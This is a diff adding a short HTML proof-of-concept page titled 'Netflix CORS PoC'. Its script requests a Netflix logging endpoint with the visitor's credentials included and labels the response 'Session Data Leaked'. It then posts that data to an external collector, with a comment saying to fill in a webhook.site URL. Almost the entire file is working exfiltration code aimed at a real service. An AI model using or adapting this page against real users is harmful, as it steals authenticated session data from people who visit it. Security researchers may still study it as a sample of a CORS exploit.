@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>Netflix CORS PoC</h2>
+    <script>
+      fetch("https://logs.netflix.com", {
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(data => {
+        console.log("[Netflix Session Data Leaked]", data);
+
+        // Replace with your webhook.site URL!
+        fetch("", {
+          method: "POST",
+          headers: { "Content-Type": "text/plain" },
+          body: data
+        });
+      });
+    </script>
+  </body>
+</html>
